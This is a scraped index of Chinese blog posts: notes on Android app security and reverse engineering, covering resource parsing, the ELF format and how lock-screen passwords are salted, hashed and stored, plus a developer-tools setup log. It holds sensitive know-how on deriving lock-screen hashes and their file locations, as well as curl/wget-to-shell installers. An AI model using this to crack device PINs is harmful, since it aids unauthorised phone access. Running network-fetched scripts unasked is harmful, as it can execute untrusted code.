TYPE_FRACTION: return \u0026#34;TYPE_FRACTION\u0026#34;; case TYPE_FIRST_INT: return \u0026#34;TYPE_FIRST_INT\u0026#34;; case TYPE_INT_HEX: return \u0026#34;TYPE_INT_HEX\u0026#34;; case TYPE_INT_BOOLEAN: return \u0026#34;TYPE_INT_BOOLEAN\u0026#34;; case TYPE_FIRST_COLOR_INT: return \u0026#34;TYPE_FIRST_COLOR_INT\u0026#34;; case TYPE_INT_COLOR_RGB8: return \u0026#34;TYPE_INT_COLOR_RGB8\u0026#34;; case TYPE_INT_COLOR_ARGB4: return \u0026#34;TYPE_INT_COLOR_ARGB4\u0026#34;; case TYPE_INT_COLOR_RGB4: return \u0026#34;TYPE_INT_COLOR_RGB4\u0026#34;; } return \u0026#34;\u0026#34;; } /*public String getDataStr(){ if(dataType == TYPE_STRING){ return ParseResourceUtils.getResString(data); }else if(dataType == TYPE_FIRST_COLOR_INT){ return Utils.bytesToHexString(Utils.int2Byte(data)); }else if(dataType == TYPE_INT_BOOLEAN){ return data==0 ? \u0026#34;false\u0026#34; : \u0026#34;true\u0026#34;; } return data+\u0026#34;\u0026#34;; }*/ public String getDataStr() { if (dataType == TYPE_STRING) { return ParseResourceUtils.getResString(data); } if (dataType == TYPE_ATTRIBUTE) { return String.format(\u0026#34;?%s%08X\u0026#34;,getPackage(data),data); } if (dataType == TYPE_REFERENCE) { return String.format(\u0026#34;@%s%08X\u0026#34;,getPackage(data),data); } if (dataType == TYPE_FLOAT) { return String.valueOf(Float.intBitsToFloat(data)); } if (dataType == TYPE_INT_HEX) { return String.format(\u0026#34;0x%08X\u0026#34;,data); } if (dataType == TYPE_INT_BOOLEAN) { return data!=0?\u0026#34;true\u0026#34;:\u0026#34;false\u0026#34;; } if (dataType == TYPE_DIMENSION) { return Float.toString(complexToFloat(data))+ DIMENSION_UNITS[data \u0026amp; COMPLEX_UNIT_MASK]; } if (dataType == TYPE_FRACTION) { return Float.toString(complexToFloat(data))+ FRACTION_UNITS[data \u0026amp; COMPLEX_UNIT_MASK]; } if (dataType \u0026gt;= TYPE_FIRST_COLOR_INT \u0026amp;\u0026amp; dataType \u0026lt;= TYPE_LAST_COLOR_INT) { return String.format(\u0026#34;#%08X\u0026#34;,data); } if (dataType \u0026gt;= TYPE_FIRST_INT \u0026amp;\u0026amp; dataType \u0026lt;= TYPE_LAST_INT) { return String.valueOf(data); } return String.format(\u0026#34;\u0026lt;0x%X, type 0x%02X\u0026gt;\u0026#34;,data, dataType); } private static String getPackage(int id) { if (id\u0026gt;\u0026gt;\u0026gt;24==1) { return \u0026#34;android:\u0026#34;; } return \u0026#34;\u0026#34;; } public static float complexToFloat(int complex) { return (float)(complex \u0026amp; 0xFFFFFF00)*RADIX_MULTS[(complex\u0026gt;\u0026gt;4) \u0026amp; 3]; } private static final float RADIX_MULTS[]={ 0.00390625F,3.051758E-005F,1.192093E-007F,4.656613E-010F }; private static final String DIMENSION_UNITS[]={ \u0026#34;px\u0026#34;,\u0026#34;dip\u0026#34;,\u0026#34;sp\u0026#34;,\u0026#34;pt\u0026#34;,\u0026#34;in\u0026#34;,\u0026#34;mm\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34; }; private static final String FRACTION_UNITS[]={ \u0026#34;%\u0026#34;,\u0026#34;%p\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;\u0026#34; }; @Override public String toString(){ return \u0026#34;size:\u0026#34;+size+\u0026#34;,res0:\u0026#34;+res0+\u0026#34;,dataType:\u0026#34;+getTypeStr()+\u0026#34;,data:\u0026#34;+getDataStr(); } } 以上代码来自于书的原作者的博客：https://blog.csdn.net/jiangwei0910410003/article/details/50628894\n博客里还有如何解析操作，留看。\n总结 这两章讲的还是挺详细的，可以留着备用查阅，这两个文件都能加以混淆来保护应用，所以还是挺重要的。\n","date":"2018-08-29T00:00:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%875-6/","title":"Android应用安全防护和逆向分析-基础篇5-6"},{"content":"Android应用安全防护和逆向分析-基础篇4 一、 基础篇④ 第四章 so文件格式解析 ELF文件格式\nso文件-\u0026gt;elf文件，文件格式看图（引用自@非虫）：\n解析工具\nreadelf 常用命令\nreadelf -h xxx.so 查头部信息\nreadelf -S xxx.so 查节（Section）信息\nreadelf -l xxx.so 查段（Program）信息\nreadelf -a xxx.so 查全部信息\n解析ELF文件\n动手解析一个elf文件 。。。\n太水 这里的内容\n直接去看源码实现用java解析elf文件信息https://github.com/fourbrother/parse_androidso\nELF 相关内容还是单独详细分析 单独写一篇吧\nELF书籍《Linux二进制分析》\n总结 加固脱壳必须掌握的知识点。\n","date":"2018-08-22T00:00:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%874/","title":"Android应用安全防护和逆向分析-基础篇4"},{"content":"Android应用安全防护和逆向分析-基础篇1 第一章 Android中锁屏密码加密算法分析 1. 锁屏密码方式： 手势\n九宫格连线\n输入密码\n指纹、人脸、虹膜\n可穿戴设备\n2. 这儿分析手势密码和输入密码 找到android源代码中的LockPatternUtils,java 这个工具类\n路径：Android-5.1.1\\frameworks\\base\\core\\java\\com\\android\\internal\\widget\n2.1 输入密码算法分析 (5.1版本的源代码 和书上细微差异)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public byte[] passwordToHash(String password, int userId) {//参数为密码和对应用户ID 默认0 if (password == null) { return null; } try { byte[] saltedPassword = (password + getSalt(userId)).getBytes(); byte[] sha1 = MessageDigest.getInstance(\u0026#34;SHA-1\u0026#34;).digest(saltedPassword); byte[] md5 = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;).digest(saltedPassword); //首先让 password+salt值 再SHA-1和MD5 byte[] combined = new byte[sha1.length + md5.length]; System.arraycopy(sha1, 0, combined, 0, sha1.length); System.arraycopy(md5, 0, combined, sha1.length, md5.length); //装换成hex值 再拼接起来 final char[] hexEncoded = HexEncoding.encode(combined); return new String(hexEncoded).getBytes(StandardCharsets.UTF_8); } catch (NoSuchAlgorithmException e) { throw new AssertionError(\u0026#34;Missing digest algorithm: \u0026#34;, e); } } 如何获取设备对应的salt值：\n1 2 3 4 5 6 7 8 9 10 11 12 13 private String getSalt(int userId) { long salt = getLong(LOCK_PASSWORD_SALT_KEY, 0, userId); if (salt == 0) { //值为0 重新生成 try { salt = SecureRandom.getInstance(\u0026#34;SHA1PRNG\u0026#34;).nextLong(); setLong(LOCK_PASSWORD_SALT_KEY, salt, userId); //保存值 Log.v(TAG, \u0026#34;Initialized lock password salt for user: \u0026#34; + userId); } catch (NoSuchAlgorithmException e) { throw new IllegalStateException(\u0026#34;Couldn\u0026#39;t get SecureRandom number\u0026#34;, e); } } return Long.toHexString(salt); // hex之后返回 } 继续跟踪 看保存的地方\n1 2 3 4 5 6 7 private long getLong(String secureSettingKey, long defaultValue, int userHandle) { try { return getLockSettings().getLong(secureSettingKey, defaultValue, userHandle); } catch (RemoteException re) { return defaultValue; } } 继续跟踪代码\n1 2 3 4 5 6 7 8 9 @VisibleForTesting public ILockSettings getLockSettings() { if (mLockSettingsService == null) { ILockSettings service = ILockSettings.Stub.asInterface( ServiceManager.getService(\u0026#34;lock_settings\u0026#34;)); //获取服务来操作 mLockSettingsService = service; } return mLockSettingsService; } 在android中 这种获取服务的方式最终实现逻辑都是在XXXService类中\n这里在LockSettingService.java中 找到这个类的getLong方法\n1 2 3 4 5 public long getLong(String key, long defaultValue, int userId) { checkReadPermission(key, userId); String value = getStringUnchecked(key, null, userId); return TextUtils.isEmpty(value) ? defaultValue : Long.parseLong(value); } 保存在数据库？\n继续跟踪\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 static class Injector { protected Context mContext; public Injector(Context context) { mContext = context; } public Context getContext() { return mContext; } public Handler getHandler() { return new Handler(); } public LockSettingsStorage getStorage() { final LockSettingsStorage storage = new LockSettingsStorage(mContext); storage.setDatabaseOnCreateCallback(new LockSettingsStorage.Callback() { @Override public void initialize(SQLiteDatabase db) { // Get the lockscreen default from a system property, if available boolean lockScreenDisable = SystemProperties.getBoolean( \u0026#34;ro.lockscreen.disable.default\u0026#34;, false); if (lockScreenDisable) { storage.writeKeyValue(db, LockPatternUtils.DISABLE_LOCKSCREEN_KEY, \u0026#34;1\u0026#34;, 0); } } }); return storage; } public LockSettingsService(Context context) { this(new Injector(context)); } 继续 查看LockSettingsStorage.java 类中 存在数据库中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 static class DatabaseHelper extends SQLiteOpenHelper { private static final String TAG = \u0026#34;LockSettingsDB\u0026#34;; private static final String DATABASE_NAME = \u0026#34;locksettings.db\u0026#34;; private static final int DATABASE_VERSION = 2; private static final int IDLE_CONNECTION_TIMEOUT_MS = 30000; private Callback mCallback; public DatabaseHelper(Context context) { super(context, DATABASE_NAME, null, DATABASE_VERSION); setWriteAheadLoggingEnabled(true); // Memory optimization - close idle connections after 30s of inactivity setIdleConnectionTimeout(IDLE_CONNECTION_TIMEOUT_MS); } public void setCallback(Callback callback) { mCallback = callback; } private void createTable(SQLiteDatabase db) { db.execSQL(\u0026#34;CREATE TABLE \u0026#34; + TABLE + \u0026#34; (\u0026#34; + \u0026#34;_id INTEGER PRIMARY KEY AUTOINCREMENT,\u0026#34; + COLUMN_KEY + \u0026#34; TEXT,\u0026#34; + COLUMN_USERID + \u0026#34; INTEGER,\u0026#34; + COLUMN_VALUE + \u0026#34; TEXT\u0026#34; + \u0026#34;);\u0026#34;); } @Override public void onCreate(SQLiteDatabase db) { createTable(db); if (mCallback != null) { mCallback.initialize(db); } } @Override public void onUpgrade(SQLiteDatabase db, int oldVersion, int currentVersion) { int upgradeVersion = oldVersion; if (upgradeVersion == 1) { // Previously migrated lock screen widget settings. Now defunct. upgradeVersion = 2; } if (upgradeVersion != DATABASE_VERSION) { Log.w(TAG, \u0026#34;Failed to upgrade database!\u0026#34;); } } } 看到了数据库的名字叫作：locksettings.db 保存在了：\n1 2 3 4 5 6 7 8 private static final String SYSTEM_DIRECTORY = \u0026#34;/system/\u0026#34;; //目录 private static final String LOCK_PATTERN_FILE = \u0026#34;gatekeeper.pattern.key\u0026#34;; private static final String BASE_ZERO_LOCK_PATTERN_FILE = \u0026#34;gatekeeper.gesture.key\u0026#34;; private static final String LEGACY_LOCK_PATTERN_FILE = \u0026#34;gesture.key\u0026#34;; //key1 private static final String LOCK_PASSWORD_FILE = \u0026#34;gatekeeper.password.key\u0026#34;; private static final String LEGACY_LOCK_PASSWORD_FILE = \u0026#34;password.key\u0026#34;; //key2 private static final String CHILD_PROFILE_LOCK_FILE = \u0026#34;gatekeeper.profile.key\u0026#34;; private static final String SYNTHETIC_PASSWORD_DIRECTORY = \u0026#34;spblob/\u0026#34;; 数据库文件存在/data/system/locksetting.db\n测试 在/data/system/下看到password.key\n打开看看：\n手动简单实现加密算法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public byte[] passwordToHash(String password) { if (password == null) { return null; } byte [] hashed = null; try { byte[] saltedPassword = (password + SALT).getBytes(); //SALT 值从数据库中得到 拿到之后进行hex转换 byte[] sha1 = MessageDigest.getInstance(\u0026#34;SHA-1\u0026#34;).digest(saltedPassword); byte[] md5 = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;).digest(saltedPassword); hashed = (toHex(sha1)+toHex(md5)).getBytes(); } catch(Exception e){ } return hashed; } private static String toHex(byte[] ary){ final String hex = \u0026#34;102031398sjdfklaj\u0026#34;; String ret = \u0026#34;\u0026#34;; for(int i=0;i\u0026lt;ary.length;i++){ ret += hex.charAt((ary[i]\u0026gt;\u0026gt; 4)\u0026amp; 0xf); ret += hex.charAt(ary[i]\u0026amp; 0xf); } return ret; } SALT 的值可以从数据库中拿到 也可以利用反射获取\n总结：\n​ MD5(输的明文密码+设备的salt).hex+ SHA1(输的的明文密码+设备的salt值).hex\n2.2 手势密码分析\n大致同上\n3. 简要： ​ 九宫格团装化成字节数组-\u0026gt;sha1 加密 即可\n其实大致流程和分析输入密码差不多 保存到本地的目录/data/system/gesture.key 文件\n","date":"2018-07-02T17:33:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%871/","title":"Android应用安全防护和逆向分析-基础篇1"},{"content":"EnvRecord 用来不时记录平时所用环境配置，以及遇到的各种问题以及解决办法。主要是为了防丢失，以及总是和空气斗志斗勇。\nWin10 日常使用\nWSL 默认不是root 设置默认root用户。ubuntu config --default-user root\non my zsh 装上\n官方github\n需要先安装ZSH。\n安装on my zsh:\nvia curl：sh -c \u0026quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\u0026quot;\nvia wget: sh -c \u0026quot;$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\u0026quot;\n然后配置喜欢的 插件+主题。vi ~/.zshrc 修改plugins属性\n必备插件git、autojump、zsh-autosuggestions。主题 经常使用ys\nGDB装上+pwndbg+peda+gef\nwsl的ubuntu不支持x86，所以主要只能调试x64的程序，而且可能会出现莫名其妙的错误。\n不过可以使用qemu来运行x86的程序，调试还是不行会出错。参考\n1 2 3 4 5 sudo apt update sudo apt install qemu-user-static sudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic \u0026#39;\\x7fELF\\x01\\x01\\x01\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x03\\x00\\x01\\x00\\x00\\x00\u0026#39; --mask \u0026#39;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfc\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xf8\\xff\\xff\\xff\\xff\\xff\\xff\\xff\u0026#39; # 运行下面的一条命令就行跑x86 不过每次打开wsl都得运行一次，很麻烦，可以写脚本自动开启。 sudo service binfmt-support start pwndbg+peda+gef\n三个都可能用到，三个工具特性不一样。各有强项，所以三个都装，使用脚本gdb.sh启动选项\n安装pwndbg:\n1 2 3 git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh peda:\n1 2 git clone https://github.com/longld/peda.git ~/peda echo \u0026#34;source ~/peda/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit gef:\n1 2 3 4 5 6 # via the install script $ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh # manually $ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py $ echo source ~/.gdbinit-gef.py \u0026gt;\u0026gt; ~/.gdbinit gdb.sh 把该文件放在/usr/local/sbin 参考\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 #!/bin/bash function Mode_change { name=$1 gdbinitfile=~/.gdbinit#这个路径按照你的实际情况修改# gdbinitfile=/root/Desktop/mode#路径按照你的实际情况修改 peda=\u0026#34;source ~/peda/peda.py\u0026#34; gef=\u0026#34;source ~/.gdbinit-gef.py\u0026#34; pwndbg=\u0026#34;source /home/pwndbg/gdbinit.py\u0026#34; sign=$(cat $gdbinitfile | grep -n \u0026#34;#this place is controled by user\u0026#39;s shell\u0026#34;) #此处上面的查找内容要和你自己的保持一致 pattern=\u0026#34;:#this place is controled by user\u0026#39;s shell\u0026#34; number=${sign%$pattern} location=$[number+2] parameter_add=${location}i parameter_del=${location}d message=\u0026#34;TEST\u0026#34; if [ $name -eq \u0026#34;1\u0026#34; ];then sed -i \u0026#34;$parameter_del\u0026#34; $gdbinitfile sed -i \u0026#34;$parameter_add $peda\u0026#34; $gdbinitfile echo -e \u0026#34;Please enjoy the peda!\\n\u0026#34; elif [ $name -eq \u0026#34;2\u0026#34; ];then sed -i \u0026#34;$parameter_del\u0026#34; $gdbinitfile sed -i \u0026#34;$parameter_add $gef\u0026#34; $gdbinitfile echo -e \u0026#34;Please enjoy the gef!\\n\u0026#34; else sed -i \u0026#34;$parameter_del\u0026#34; $gdbinitfile sed -i \u0026#34;$parameter_add $pwndbg\u0026#34; $gdbinitfile echo -e \u0026#34;Please enjoy the pwndbg!\\n\u0026#34; fi } echo -e \u0026#34;Please choose one mode of GDB?\\n1.peda 2.gef 3.pwndbg\u0026#34; read -p \u0026#34;Input your choice:\u0026#34; num if [ $num -eq \u0026#34;1\u0026#34; ];then Mode_change $num elif [ $num -eq \u0026#34;2\u0026#34; ];then Mode_change $num elif [ $num -eq \u0026#34;3\u0026#34; ];then Mode_change $num else echo -e \u0026#34;Error!\\nPleasse input right number!\u0026#34; fi gdb $1 $2 $3 $4 $5 $6 $7 $8 $9# r2全家桶 （逆向调试神器）\n1 2 3 git clone https://github.com/radare/radare2.git cd radare2 sys/install.sh#Install / Update gcc arm aarch aarch64\nsudo apt install gcc-arm-linux-gnueabi 使用命令arm-linux-gnueabi-gcc\nsudo apt install gcc-aarch64-linux-gnu 使用命令aarch64-linux-gnu-gcc\nclang+llvm\n方法一，手动编译安装，费时费力\n方法二 apt\n完整方法这个地址\n只写ubuntu 18,04\n编辑 /etc/apt/sources.list，添加源 1 2 3 4 5 6 7 8 9 # i386 not available deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic main deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic main # 7 deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic-7 main deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic-7 main # 8 deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic-8 main deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic-8 main 添加证书 1 2 wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key|sudo apt-key add - # Fingerprint: 6084 F3CF 814B 57C1 CF12 EFD5 15CF 4D18 AF4F 7421 安装 版本8 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # LLVM apt-get install libllvm-8-ocaml-dev libllvm8 llvm-8 llvm-8-dev llvm-8-doc llvm-8-examples llvm-8-runtime # Clang and co apt-get install clang-8 clang-tools-8 clang-8-doc libclang-common-8-dev libclang-8-dev libclang1-8 clang-format-8 python-clang-8 # libfuzzer apt-get install libfuzzer-8-dev # lldb apt-get install lldb-8 # lld (linker) apt-get install lld-8 # libc++ apt-get install libc++-8-dev libc++abi-8-dev # OpenMP apt-get install libomp-8-dev python3+pip\napt install python3 python3-pip、python-pip\npython库\nfrida （hook) 同win下使用\npwntools (py2)\ngmpy2 (py2-3)\nr2Frida\nBrida\nvscode （666） 主要是各种插件\nzh-ch （汉化包）\nbackground （右下角小萌人）\ncmder** (Win下强大的终端工具)** 官网下载安装\n简单配置：\nwsl vim 无法使用上下左右键解决\npy2-py3 官网找想要的包下载，同时装两个版本。\n修改环境变量，日常使用py3,把py3的环境变量放在前面，去py2的安装目录复制一份python.exe 更名为python2.exe，就可以使用python2作为命令输入。\npip配置为国内源会快很多\nJava8+jdk最新 官网下载安装\n下个jdk最新版防止部分工具需要。\n可能有时候还需要配置环境变量JAVA_HOME为JDK路径。\nGolang 也是只需下载安装就ok.\nNodeJS 也是只需下载安装就ok. 推荐稳定版。\n会默认安装npm，然而下载速度实在太慢，使用淘宝镜像cnpm ,用法相同\nnpm install -g cnpm --registry=https://registry.npm.taobao.org\ngit 官网下载安装完事\nYarn 官网下载安装完事\nCMake 下载安装ok\nhugo (博客工具) 下载exe到本地，配置环境变量\nHaskell Stack 官方文档、win直接下载安装\nStartlsBack (win下的美化工具) 下载安装 配置底部透明和居中\nNotepad++ (轻便的编辑器) 下载安装\nAndroid SDK 配置 adb工具 在目录platform-tools\nemulator、monitor 在tools下\nNDK-build 在ndk-bundle\nflutter (Google 跨平台框架) 有官网了\n下载SDK-\u0026gt;配置环境变量 flutter\\bin 。添加名为”PUB_HOSTED_URL”和”FLUTTER_STORAGE_BASE_URL”的条目。\nAndorid Studio设置\n安装插件\nFlutter插件： 支持Flutter开发工作流 (运行、调试、热重载等).\nDart插件： 提供代码分析 (输入代码时进行验证、代码补全等).\nVScode设置\n安装插件\nflutter Genymotion+逍遥Android (Android 模拟器) 下载安装ok\nCUDA （N卡xxx) 根据自己的显卡官网下载包\n根据需求安装。\n有个坑，如果为pytorch 或TensorFlow做前提 先看看这两支持的版本再安装相应的版本。\npytorch 需求前置环境也得装好 官方有很方便的安装方法 根据不同平台和环境\nTensorFlow 前置环境查官网 1 2 3 4 5 # GPU版本 py3 pip3 install tensorflow-gpu# stable pip3 install tf-nightly-gpu# preview pip3 install tensorflow-gpu==2.0.0-alpha0##TensorFlow 2.0 Alpha# CPU 版本 pip3 install --user --upgrade tensorflow tensorflow - 仅支持 CPU 的最新稳定版（建议新手使用）\ntensorflow-gpu - 支持 GPU 的最新稳定版（适用于 Ubuntu 和 Windows）\ntf-nightly - 仅支持 CPU 的预览每夜版（不稳定）\ntf-nightly-gpu - 支持 GPU 的预览每夜版（不稳定，适用于 Ubuntu 和 Windows）\ntensorflow==2.0.0-alpha0 - 仅支持 CPU 的预览 TF 2.0 Alpha 版（不稳定）\ntensorflow-gpu==2.0.0-alpha0 - 支持 GPU 的预览 TF 2.0 Alpha 版（不稳定，Ubuntu 和 Windows）\nVMware pro （虚拟机） 装MacOS记录 VBox （虚拟机） 安装拓展包 Xshell、Xftp (free for Home/School) free 的要去官网下载 填写信息，邮箱打开链接下载。\nTeamViewer (远程连接) 各种IDE、集成环境 只记录 Visual Studio 2019\nPycharm\nIDEA\n微信web开发工具\nphpStudy\nAndroid Studio (风扇~~ ~~)\nOther 不做记录\nUbuntu 18.04 一般用来调代码。 大部分配置同上面WSL,只记录不做过多介绍\non my zsh gdb+pwndbg+peda+gef 美化 manjaro 很喜欢的Linux发行版。基于ArchLinux，软件多，好看又好用。\nMac m2 没法用 放弃 等等 ","date":"0001-01-01T00:00:00Z","permalink":"https://ykiko.top/p/envrecord/","title":"EnvRecord"}]